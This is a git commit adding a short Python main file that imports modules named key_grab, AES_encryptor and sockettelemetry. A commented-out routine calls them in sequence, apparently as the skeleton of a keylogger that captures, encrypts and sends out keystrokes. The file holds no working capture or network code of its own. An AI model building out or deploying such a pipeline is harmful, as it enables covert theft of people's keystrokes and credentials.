264ea6e8377bfc72729b271c3aa9d2443aef085a
sidharth-chingarath <sidharthholms.ccna+github@gmail.com>
2024-09-05 10:38:49 +0530

    feat : added main file

---
+++ src/target/target_main.py
@@ -0,0 +1,16 @@
+from collector import key_grab
+from encription import AES_encryptor
+from telemetry import sockettelemetry
+import time
+
+time_seconds=1
+# def main_function():
+#     key_grab.key_grab()
+#     time.sleep(time_seconds)
+#     AES_encryptor.encryption_function()
+#     time.sleep(time_seconds)
+#     sockettelemetry.socket_client()
+#     time.sleep(time_seconds)
+#     print("Collection Ended")
+
+# main_function()
